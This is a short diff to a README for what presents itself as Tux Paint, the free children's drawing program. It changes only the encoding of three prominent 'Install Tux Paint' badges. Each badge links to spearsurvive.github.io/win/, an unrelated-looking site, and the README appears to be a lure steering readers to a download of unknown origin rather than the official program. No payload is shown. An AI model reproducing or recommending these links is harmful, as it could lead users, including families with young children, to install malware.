@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Tux Paint](https://img.shields.io/badge/⬇_Install_Tux%20Paint-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Tux Paint](https://img.shields.io/badge/⬇_Install_Tux+Paint-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ Tux Paint is a free, open-source drawing program for children aged 3 to 12. It f
 
 <div align="center">
 
-[![⬇ Install Tux Paint](https://img.shields.io/badge/⬇_Install_Tux%20Paint-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Tux Paint](https://img.shields.io/badge/⬇_Install_Tux+Paint-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ Tux Paint is a free, open-source drawing program for children aged 3 to 12. It f
 
 <div align="center">
 
-[![⬇ Install Tux Paint](https://img.shields.io/badge/⬇_Install_Tux%20Paint-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install Tux Paint](https://img.shields.io/badge/⬇_Install_Tux+Paint-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
